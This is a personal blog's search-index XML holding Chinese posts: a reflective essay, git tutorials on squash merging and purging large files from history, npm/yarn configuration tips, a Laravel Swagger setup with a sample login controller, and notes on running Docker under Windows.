<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【心情文章】我有三问:我是谁？从那里来？要去哪里？</title>
    <url>/2020/04/11/%E3%80%90%E5%BF%83%E6%83%85%E6%96%87%E7%AB%A0%E3%80%91%E4%B8%8D%E8%AF%81%E4%B9%8B%E8%AF%81/</url>
    <content><![CDATA[<p>&emsp;那是个夏季深夜，我爬上了屋顶，站的很高，俯视脚下的世界。星空万里，头顶着一轮满月，没云，也没风。月光撒满了脚下的世界，明亮的屋顶，平静的池塘，路边的树影…四周死一般的寂静。刚开始，我很兴奋，仿佛全世界就我一个人，我想去哪就去哪。慢慢平静下来后，孤独开始侵蚀我的内心。我仿佛从这个世界中抽离出来，看着眼前这个像是被定格在画卷的世界。我就在想：我是谁？我从哪里来？要去哪里？望着天上的星星和月亮，这个世界的一切都有它们的规律。<br><a id="more"></a><br>&emsp;  太阳从这边升起那边落下；现在是深夜，将来是白天；…。那我呢？我是谁？从哪里来？要去哪里？我就像是一个外来者，与这个世界的唯一联系就是生存。今晚当我感觉我从这个世界中抽离出来时，我真的不知道下一步要去哪，这里不是我的世界。如果我们真是的是外来的，那也就能解释的通《道德经》写的那样”道可道，非常道”–我们只是认为这个世界是那样，其实不是。我们与这个世界的唯一联系就是生存，为此需要对这个陌生的世界的东西进行定义，进而使用。<br>&emsp; 总结起来的几个猜想就是：1，我们可能不是这个世界的，只是不知道为什么意识出现在这里？2，我们跟这个世界的唯一联系就是生存，而这个世界赋与我们另一个意识也就是我们的“兽性”，帮助我们生存下去。3，如果前面的猜想是正确的，那我们可能来自一个绝对理智的世界。</p>
]]></content>
      <categories>
        <category>心情文章</category>
      </categories>
      <tags>
        <tag>心情文章</tag>
      </tags>
  </entry>
  <entry>
    <title> 【git】学习笔记--提交</title>
    <url>/2020/04/09/%E3%80%90git%E3%80%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8F%90%E4%BA%A4/</url>
    <content><![CDATA[<h3 id="1-合并提交"><a href="#1-合并提交" class="headerlink" title="1 合并提交"></a>1 合并提交</h3><div class="note info">
            <p>合并提交就是把一个先进分支的记录以一个提交的形式合并到当前的分支上。比如保持主分支上的提交一个提交 一个完善粒度。开发的往往是新开一个分支，可以代码写到一半就下班了，这里不得不上传代码，写上一个不太好的提交。特别是写一点代码意外要换地方，不得不产生一个没用的提交信息并上传，到了新的地方开发并同步。这样的提交只是单纯为了同步下代码而已，并不是一个完善粒度的代码提交，而这这样的提交一多，再合并到主分支上，那么主分支是记录是很不好看的。很不好，所以合并提交是很必要的。</p>
          </div>
<h4 id="1-1-初始一个demo仓库"><a href="#1-1-初始一个demo仓库" class="headerlink" title="1.1 初始一个demo仓库"></a>1.1 初始一个<code>demo</code>仓库</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ git init</span><br><span class="line">初始化空的 Git 版本库于 /home/www/tmp/demo/.git/</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">'the content for first commit'</span> &gt; index.html</span><br><span class="line">$ git add -A</span><br><span class="line">$ git commit -m <span class="string">'init'</span></span><br><span class="line">[master（根提交） a5a9caf] init</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 index.html</span><br></pre></td></tr></table></figure></div>
<a id="more"></a>
<h4 id="1-2-在开发分支上有多个提交"><a href="#1-2-在开发分支上有多个提交" class="headerlink" title="1.2 在开发分支上有多个提交"></a>1.2 在开发分支上有多个提交</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ git checkout -b dev</span><br><span class="line">切换到一个新分支 <span class="string">'dev'</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">'commit 1'</span> &gt;&gt; index.html</span><br><span class="line">$ git add  -A</span><br><span class="line">$ git commit -m <span class="string">'commit form dev branch'</span></span><br><span class="line">[dev 8c5d483] commit form dev branch</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">'commit 2'</span> &gt;&gt; index.html</span><br><span class="line">$ git add -A</span><br><span class="line">$ git commit -m <span class="string">'commit 2 form dev branch'</span></span><br><span class="line">[dev 9fdf10d] commit 2 form dev branch</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line">$ git <span class="built_in">log</span></span><br><span class="line">commit 9fdf10dd2d9405b88714fdf8e6694bc31d9eba97</span><br><span class="line">Author: 吴楚衡 &lt;wuchuheng@163.com&gt;</span><br><span class="line">Date:   Fri Apr 10 15:23:57 2020 +0800</span><br><span class="line"></span><br><span class="line">    commit 2 form dev branch</span><br><span class="line"></span><br><span class="line">commit 8c5d4833c061d2e25ecf613d1877377f9bb998cd</span><br><span class="line">Author: 吴楚衡 &lt;wuchuheng@163.com&gt;</span><br><span class="line">Date:   Fri Apr 10 15:23:23 2020 +0800</span><br><span class="line"></span><br><span class="line">    commit form dev branch</span><br><span class="line"></span><br><span class="line">commit a5a9caf8cdba3349c1eb9f615eb1ef94c696b7ec</span><br><span class="line">Author: 吴楚衡 &lt;wuchuheng@163.com&gt;</span><br><span class="line">Date:   Fri Apr 10 15:12:59 2020 +0800</span><br><span class="line"></span><br><span class="line">    init</span><br><span class="line">[www@iZwz9e5pkvbqcoduhq26mhZ demo]$</span><br></pre></td></tr></table></figure></div>
<h4 id="1-3-把分支的记录作为主分支的一个新的记录"><a href="#1-3-把分支的记录作为主分支的一个新的记录" class="headerlink" title="1.3 把分支的记录作为主分支的一个新的记录"></a>1.3 把分支的记录作为主分支的一个新的记录</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* dev</span><br><span class="line">  master</span><br><span class="line">$ git checkout master</span><br><span class="line">切换到分支 <span class="string">'master'</span></span><br><span class="line">$ git merge dev --squash</span><br><span class="line">更新 a5a9caf..9fdf10d</span><br><span class="line">Fast-forward</span><br><span class="line">压缩提交 -- 未更新 HEAD</span><br><span class="line"> index.html | 2 ++</span><br><span class="line"> 1 file changed, 2 insertions(+)</span><br><span class="line">$ git status</span><br><span class="line"><span class="comment"># 位于分支 master</span></span><br><span class="line"><span class="comment"># 要提交的变更：</span></span><br><span class="line"><span class="comment">#   （使用 "git reset HEAD &lt;file&gt;..." 撤出暂存区）</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#       修改：      index.html</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">$ git commit -m <span class="string">'make new commit from dev change'</span></span><br><span class="line">[master 19c9aa9] make new commit from dev change</span><br><span class="line"> 1 file changed, 2 insertions(+)</span><br><span class="line">$ git <span class="built_in">log</span></span><br><span class="line">commit 19c9aa94f0fc02ea14f2505775b425e3c23a93e4</span><br><span class="line">Author: 吴楚衡 &lt;wuchuheng@163.com&gt;</span><br><span class="line">Date:   Fri Apr 10 15:29:38 2020 +0800</span><br><span class="line"></span><br><span class="line">    make new commit from dev change</span><br><span class="line"></span><br><span class="line">commit a5a9caf8cdba3349c1eb9f615eb1ef94c696b7ec</span><br><span class="line">Author: 吴楚衡 &lt;wuchuheng@163.com&gt;</span><br><span class="line">Date:   Fri Apr 10 15:12:59 2020 +0800</span><br><span class="line"></span><br><span class="line">    init</span><br></pre></td></tr></table></figure></div>
<h4 id="1-4-小结"><a href="#1-4-小结" class="headerlink" title="1.4 小结"></a>1.4 小结</h4><div class="note warning">
            <p>在<code>dev</code>分支上的所有修改记录先进的内容会在主分支上会作为新的修改文件保存在暂存区中，这里<code>dev</code>不管提交什么样的记录，只要开发者感觉凑足够一个主分支的记录，完全可以作为一个主分支的一个记录来提交.</p>
          </div>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>【git】git如何删除历史上的文件</title>
    <url>/2020/04/02/%E3%80%90git%E3%80%91git%E5%A6%82%E4%BD%95%E5%88%A0%E9%99%A4%E5%8E%86%E5%8F%B2%E4%B8%8A%E7%9A%84%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h3 id="1-场景说明"><a href="#1-场景说明" class="headerlink" title="1 场景说明"></a>1 场景说明</h3><p>&emsp;也许在<code>git</code>的记录中提交过一些文件，由于已经没用了，想删除的很彻底，历史记录也不想要的那种，就好比，不仅想让人滚，还得从记忆中滚的那种，从思想的层面上滚。–言归正传，<code>git</code>可以的.<br>&emsp;常规的删除是不能删除的，文件还是在<code>git</code>的记录中，还是占用着硬盘空间。</p>
<h3 id="2-操作"><a href="#2-操作" class="headerlink" title="2 操作"></a>2 操作</h3><h4 id="2-1-查看大文件"><a href="#2-1-查看大文件" class="headerlink" title="2.1 查看大文件"></a>2.1 查看大文件</h4><div class="note info">
            <p>列出历史前10大文件, 最大的有<code>67771512</code>字节60多M,这是不合理的</p>
          </div>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ git rev-list --all | xargs -rL1 git ls-tree -r --long | sort -uk3 | sort -rnk4 | head -10</span><br></pre></td></tr></table></figure></div>
<p><img src="http://qiniu.wuchuheng.com/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200403194714.png" alt></p>
<a id="more"></a>
<h4 id="2-2-删除文件"><a href="#2-2-删除文件" class="headerlink" title="2.2 删除文件"></a>2.2 删除文件</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">git filter-branch --force --index-filter  <span class="string">'git rm --cached --ignore-unmatch source/library/tool/windows/Postman-win64-6.1.3-Setup.exe'</span> --prune-empty --tag-name-filter cat -- --all</span><br></pre></td></tr></table></figure></div>
<div class="note info">
            <p>再次查看，文件已经删除了，而<code>git</code>并没有任何提示.</p>
          </div>
<p><img src="http://qiniu.wuchuheng.com/img/20200403194714.png" alt></p>
<blockquote>
<p>注：本文参考资料<br> <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGVwbG95aHEuY29tL2dpdC9mYXFzL3JlbW92aW5nLWxhcmdlLWZpbGVzLWZyb20tZ2l0LWhpc3Rvcnk=" title="https://www.deployhq.com/git/faqs/removing-large-files-from-git-history">How can I remove a large file from my commit history?<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0hhcHB5Um9ja2luZy9hcnRpY2xlL2RldGFpbHMvODkzMTM1MDE=" title="https://blog.csdn.net/HappyRocking/article/details/89313501">彻底删除git中的较大文件（包括历史提交记录）<i class="fa fa-external-link"></i></span></p>
</blockquote>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>【前端】npm和yarn踩坑录</title>
    <url>/2020/04/02/%E3%80%90%E5%89%8D%E7%AB%AF%E3%80%91npm%E5%92%8Cyarn%E8%B8%A9%E5%9D%91%E5%BD%95/</url>
    <content><![CDATA[<h3 id="1-yarn全局安装包找不到的问题"><a href="#1-yarn全局安装包找不到的问题" class="headerlink" title="1 yarn全局安装包找不到的问题?"></a>1 <code>yarn</code>全局安装包找不到的问题?</h3><p>&emsp;找出包安装包的<code>bin</code>启动目录</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">export</span> PATH=<span class="string">"<span class="variable">$(yarn bin)</span>:<span class="variable">$PATH</span>"</span></span><br><span class="line">$ <span class="built_in">export</span> PATH=<span class="string">"<span class="variable">$(yarn global bin)</span>:<span class="variable">$PATH</span>"</span></span><br></pre></td></tr></table></figure></div>
<p>以上的路径不一定对，最终以全局安装包的实际<code>.bin</code>目录为准，写入<code>.bashrc</code>或<code>.zshrc</code></p>
<a id="more"></a>
<h3 id="2-代理"><a href="#2-代理" class="headerlink" title="2 代理"></a>2 代理</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ <span class="comment"># 设置</span></span><br><span class="line">$ npm config <span class="built_in">set</span> proxy=http://&lt;host&gt;:&lt;port&gt;</span><br><span class="line">$ npm confit <span class="built_in">set</span> https-proxy http://&lt;username:password@&gt;&lt;host&gt;:&lt;port&gt;</span><br><span class="line">$ <span class="comment"># 重置</span></span><br><span class="line">$ npm config delete proxy</span><br><span class="line">$ npm config delete https-proxy</span><br></pre></td></tr></table></figure></div>
<h3 id="3-靠谱源"><a href="#3-靠谱源" class="headerlink" title="3 靠谱源"></a>3 靠谱源</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>yarn</tag>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>【php】larave使用swagger</title>
    <url>/2020/04/02/%E3%80%90php%E3%80%91larave%E4%BD%BF%E7%94%A8swagger/</url>
    <content><![CDATA[<h3 id="1-环境"><a href="#1-环境" class="headerlink" title="1 环境"></a>1 环境</h3><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>php</code></td>
<td>7.2.8</td>
</tr>
<tr>
<td><code>laravel</code></td>
<td>7.4.0</td>
</tr>
</tbody>
</table>
<h4 id="2-操作"><a href="#2-操作" class="headerlink" title="2 操作"></a>2 操作</h4><h5 id="2-1-安装larave的swagger-openApi的库"><a href="#2-1-安装larave的swagger-openApi的库" class="headerlink" title="2.1 安装larave的swagger, openApi的库"></a>2.1 安装<code>larave</code>的<code>swagger</code>, <code>openApi</code>的库</h5><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$ composer <span class="keyword">require</span> <span class="string">"darkaonline/l5-swagger"</span></span><br></pre></td></tr></table></figure></div>
<p>安装完毕后访问<code>&lt;host&gt;/api/documentation</code></p>
<p><img src="http://qiniu.wuchuheng.com/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200403140929.png" alt></p>
<p>由于没有生成<code>api-docs.json</code>,所以访问不了</p>
<h5 id="2-2-生成api数据"><a href="#2-2-生成api数据" class="headerlink" title="2.2 生成api数据"></a>2.2 生成<code>api</code>数据</h5><ul>
<li>生成要接口的控制器</li>
</ul>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$  php artisan make:controller  UserController</span><br></pre></td></tr></table></figure></div>
<a id="more"></a>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">User</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Auth</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Lcobucci</span>\<span class="title">JWT</span>\<span class="title">Parser</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Response</span> <span class="title">as</span> <span class="title">ResponseHTTP</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Validator</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@OA</span>\Info(</span></span><br><span class="line"><span class="comment"> *      version="1.0.0",</span></span><br><span class="line"><span class="comment"> *      title="L5 OpenApi",</span></span><br><span class="line"><span class="comment"> *      description="L5 Swagger OpenApi description",</span></span><br><span class="line"><span class="comment"> *      <span class="doctag">@OA</span>\Contact(</span></span><br><span class="line"><span class="comment"> *          email="darius<span class="doctag">@matulionis</span>.lt"</span></span><br><span class="line"><span class="comment"> *      ),</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@OA</span>\License(</span></span><br><span class="line"><span class="comment"> *         name="Apache 2.0",</span></span><br><span class="line"><span class="comment"> *         url="http://www.apache.org/licenses/LICENSE-2.0.html"</span></span><br><span class="line"><span class="comment"> *     )</span></span><br><span class="line"><span class="comment"> * )</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@OA</span>\SecurityScheme(</span></span><br><span class="line"><span class="comment"> *     type="oauth2",</span></span><br><span class="line"><span class="comment"> *     description="Use a global client_id / client_secret and your username / password combo to obtain a token",</span></span><br><span class="line"><span class="comment"> *     name="Password Based",</span></span><br><span class="line"><span class="comment"> *     in="header",</span></span><br><span class="line"><span class="comment"> *     scheme="https",</span></span><br><span class="line"><span class="comment"> *     securityScheme="Password Based",</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@OA</span>\Flow(</span></span><br><span class="line"><span class="comment"> *         flow="password",</span></span><br><span class="line"><span class="comment"> *         authorizationUrl="/oauth/authorize",</span></span><br><span class="line"><span class="comment"> *         tokenUrl="/oauth/token",</span></span><br><span class="line"><span class="comment"> *         refreshUrl="/oauth/token/refresh",</span></span><br><span class="line"><span class="comment"> *         scopes=&#123;&#125;</span></span><br><span class="line"><span class="comment"> *     )</span></span><br><span class="line"><span class="comment"> * )</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@OA</span>\Tag(</span></span><br><span class="line"><span class="comment"> *     name="project",</span></span><br><span class="line"><span class="comment"> *     description="Everything about your Projects",</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@OA</span>\ExternalDocumentation(</span></span><br><span class="line"><span class="comment"> *         description="Find out more",</span></span><br><span class="line"><span class="comment"> *         url="http://swagger.io"</span></span><br><span class="line"><span class="comment"> *     )</span></span><br><span class="line"><span class="comment"> * )</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@OA</span>\Tag(</span></span><br><span class="line"><span class="comment"> *     name="user",</span></span><br><span class="line"><span class="comment"> *     description="用户相关接口",</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@OA</span>\ExternalDocumentation(</span></span><br><span class="line"><span class="comment"> *         description="Find out more about",</span></span><br><span class="line"><span class="comment"> *         url="http://swagger.io"</span></span><br><span class="line"><span class="comment"> *     )</span></span><br><span class="line"><span class="comment"> * )</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@OA</span>\ExternalDocumentation(</span></span><br><span class="line"><span class="comment"> *     description="Find out more about Swagger",</span></span><br><span class="line"><span class="comment"> *     url="http://swagger.io"</span></span><br><span class="line"><span class="comment"> * )</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AccountController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@OA</span>\Get(</span></span><br><span class="line"><span class="comment"> *      path="/projects",</span></span><br><span class="line"><span class="comment"> *      operationId="getProjectsList",</span></span><br><span class="line"><span class="comment"> *      tags=&#123;"user"&#125;,</span></span><br><span class="line"><span class="comment"> *      summary="Get list of projects",</span></span><br><span class="line"><span class="comment"> *      description="Returns list of projects",</span></span><br><span class="line"><span class="comment"> *      <span class="doctag">@OA</span>\Response(</span></span><br><span class="line"><span class="comment"> *          response=200,</span></span><br><span class="line"><span class="comment"> *          description="successful operation"</span></span><br><span class="line"><span class="comment"> *       ),</span></span><br><span class="line"><span class="comment"> *       <span class="doctag">@OA</span>\Response(response=400, description="Bad request"),</span></span><br><span class="line"><span class="comment"> *       security=&#123;</span></span><br><span class="line"><span class="comment"> *           &#123;"api_key_security_example": &#123;&#125;&#125;</span></span><br><span class="line"><span class="comment"> *       &#125;</span></span><br><span class="line"><span class="comment"> *     )</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns list of projects</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      login API</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      <span class="doctag">@return</span> \Illuminate\Http\Response</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">(Request $request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $validator = Validator::make($request-&gt;all(), [</span><br><span class="line">                <span class="string">'email'</span> =&gt; <span class="string">'required'</span>,</span><br><span class="line">                <span class="string">'password'</span> =&gt; <span class="string">'required'</span>,</span><br><span class="line">            ]);</span><br><span class="line"></span><br><span class="line">            $data = [];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($validator-&gt;fails()) &#123;</span><br><span class="line">                $errors = $validator-&gt;errors();</span><br><span class="line">                <span class="keyword">foreach</span> ($errors-&gt;all() <span class="keyword">as</span> $field =&gt; $validationMessage) &#123;</span><br><span class="line">                    $data[<span class="string">'error'</span>][] = $validationMessage;</span><br><span class="line">                &#125;</span><br><span class="line">                $success = [</span><br><span class="line">                    <span class="string">'status'</span> =&gt; ResponseHTTP::HTTP_BAD_REQUEST,</span><br><span class="line">                    <span class="string">'data'</span> =&gt; $data</span><br><span class="line">                ];</span><br><span class="line">                $message = <span class="string">'Validation failed!.'</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (Auth::guard()-&gt;attempt([<span class="string">'email'</span> =&gt; request(<span class="string">'email'</span>), <span class="string">'password'</span> =&gt; request(<span class="string">'password'</span>)])) &#123;</span><br><span class="line">                    $user = Auth::user()-&gt;select(<span class="string">'id'</span>, <span class="string">'first_name'</span>, <span class="string">'last_name'</span>, <span class="string">'email'</span>, <span class="string">'avatar'</span>, <span class="string">'referral_code'</span>)-&gt;where(<span class="string">'id'</span>, Auth::id())-&gt;get()-&gt;first();</span><br><span class="line"></span><br><span class="line">                    $data[<span class="string">'token'</span>] = $user-&gt;createToken(<span class="string">'MyApp'</span>)-&gt;accessToken;</span><br><span class="line">                    $data[<span class="string">'user'</span>] = $user;</span><br><span class="line"></span><br><span class="line">                    $success = [</span><br><span class="line">                        <span class="string">'status'</span> =&gt; ResponseHTTP::HTTP_OK ,</span><br><span class="line">                        <span class="string">'data'</span> =&gt; $data,</span><br><span class="line">                    ];</span><br><span class="line"></span><br><span class="line">                    $message = <span class="string">'Login successfull!.'</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//store device information</span></span><br><span class="line">                    UserDevice::addUserDevices($request, $user, config(<span class="string">'constants.status.active'</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $success = [</span><br><span class="line">                        <span class="string">'status'</span> =&gt; ResponseHTTP::HTTP_BAD_REQUEST ,</span><br><span class="line">                    ];</span><br><span class="line">                    $message = <span class="string">'Invalid Email or Password!.'</span>;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;APIResponse-&gt;respondWithMessageAndPayload($success ,$message);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;APIResponse-&gt;handleAndResponseException($e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>添加接口路由到<code>&lt;root&gt;/routes/api.php</code></li>
</ul>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">Route::post(<span class="string">'login'</span>, <span class="string">'UserController@login'</span>);</span><br></pre></td></tr></table></figure></div>
<ul>
<li>最后生成可以访问的<code>swagger</code>的<code>api</code>文档数据<code>/docs/api-docs.json</code></li>
</ul>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ php artisan l5-swagger:generate</span><br></pre></td></tr></table></figure></div>
<ul>
<li>刷新下刚才的页面</li>
</ul>
<p><img src="http://qiniu.wuchuheng.com/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200403142946.png" alt></p>
<h3 id="3-小结"><a href="#3-小结" class="headerlink" title="3 小结"></a>3 小结</h3><p>用<code>swagger</code>有什么好处?我想可以是方便吧，在写代码的同时也能在同一个地方编写<code>api</code>文档是很方便</p>
<blockquote>
<p>注: 本文章参考资料</p>
</blockquote>
<ul>
<li>(大部分)<span class="exturl" data-url="aHR0cDovL3Byb21wdHNvZnRlY2guY29tL2Jsb2cvaG93LXRvLXVzZS1zd2FnZ2VyLXRvb2wtZm9yLWFwaS1kb2N1bWVudGF0aW9uLw==" title="http://promptsoftech.com/blog/how-to-use-swagger-tool-for-api-documentation/">How to Use Swagger Tool for API Documentation?<i class="fa fa-external-link"></i></span></li>
<li>(大部分)<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0RhcmthT25MaW5lL0w1LVN3YWdnZXI=" title="https://github.com/DarkaOnLine/L5-Swagger">源码库<i class="fa fa-external-link"></i></span></li>
<li>(小部分)<span class="exturl" data-url="aHR0cHM6Ly93d3cuYnJlYWt5aXpoYW4uY29tL3N3YWdnZXIvMjgwNi5odG1sIzEzMw==" title="https://www.breakyizhan.com/swagger/2806.html#133">什么是OpenAPI？Swagger是什么？<i class="fa fa-external-link"></i></span></li>
</ul>
<blockquote>
<p>本文章测试<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3d1Y2h1aGVuZy9sYXJhdmVybF9kZW1vL3RyZWUvc3dhZ2dlcg==" title="https://github.com/wuchuheng/laraverl_demo/tree/swagger"><code>demo</code>源码<i class="fa fa-external-link"></i></span></p>
</blockquote>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>swagger</tag>
      </tags>
  </entry>
  <entry>
    <title>【linux】关于在windows下使用docker的手记</title>
    <url>/2020/03/13/%E3%80%90linux%E3%80%91vagrant%E5%AE%9D%E5%A1%94box/</url>
    <content><![CDATA[<h4 id="1-关于docker在windows运行起来的说明。"><a href="#1-关于docker在windows运行起来的说明。" class="headerlink" title="1,关于docker在windows运行起来的说明。"></a>1,关于<code>docker</code>在<code>windows</code>运行起来的说明。</h4><p>&emsp;<code>docker</code>的容器基本上是基本<code>linux</code>内核之上来运行的，所以<code>windows</code>上是跑不起来<code>docker</code>，在，而在<code>windows</code>能运行的起来是基于虚拟机来实现，在<code>windows</code>上运行虚拟机，而虚拟机运行<code>linux</code>，而有了<code>linux</code>,<code>docker</code>也就能运行的起来了。本质上还是2个系统。<br><a id="more"></a></p>
<h4 id="2-FQA记录"><a href="#2-FQA记录" class="headerlink" title="2, FQA记录"></a>2, FQA记录</h4><h5 id="2-1-docker-compose-yml挂载卷失败-并提示-quot-Message-quot-quot-Unhandled-exception-Drive-has-not-been-shared-quot"><a href="#2-1-docker-compose-yml挂载卷失败-并提示-quot-Message-quot-quot-Unhandled-exception-Drive-has-not-been-shared-quot" class="headerlink" title="2.1 docker-compose.yml挂载卷失败,并提示{&quot;Message&quot;:&quot;Unhandled exception: Drive has not been shared&quot;}."></a>2.1 <code>docker-compose.yml</code>挂载卷失败,并提示<code>{&quot;Message&quot;:&quot;Unhandled exception: Drive has not been shared&quot;}.</code></h5><p>这个可能是当前的硬盘没给权限。在<code>docker</code>的<code>Settting &gt; Resources &gt; FLE SHARING</code> 中把要挂载的卷的盘符打勾.</p>
